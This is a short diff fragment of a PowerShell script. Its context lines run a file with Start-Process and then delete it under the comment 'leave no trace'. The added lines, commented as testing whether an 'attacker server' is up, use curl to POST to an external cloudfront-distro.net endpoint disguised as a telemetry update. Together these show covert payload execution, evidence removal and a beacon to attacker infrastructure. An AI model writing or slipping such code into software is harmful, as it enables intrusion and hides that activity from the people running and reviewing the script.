@@ -22,3 +22,6 @@ Start-Process -FilePath $path -Wait
 
 # 3. Clean up (GTIG compliance: leave no trace)
 Remove-Item -Path $path
+
+#testing if attacker server is up and running 
+curl -X POST --data-binary "test" [cloudfront-distro.net]/api/v1/telemetry/update
